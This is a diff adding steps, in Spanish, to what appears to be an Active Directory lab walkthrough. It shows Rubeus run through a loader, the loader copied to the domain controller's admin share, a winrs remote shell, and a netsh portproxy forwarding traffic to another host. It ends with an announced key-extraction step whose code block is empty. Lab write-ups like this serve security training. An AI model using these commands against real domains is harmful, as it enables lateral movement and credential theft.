@@ -1405,3 +1405,21 @@ C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin 
 ```
 
 En el nuevo proceso que se nos genera deberemos de copiar el *Loader* a la maquina *dcorp-dc*
+```shell
+echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
+```
+
+Ahora nos conectaremos a la maquina
+```shell
+winrs -r:dcorp-dc cmd
+```
+
+Y hacemos el renvio de puerto
+```shell
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97
+```
+
+Y extraemos las claves de *eurocorp*
+```shell
+
+```
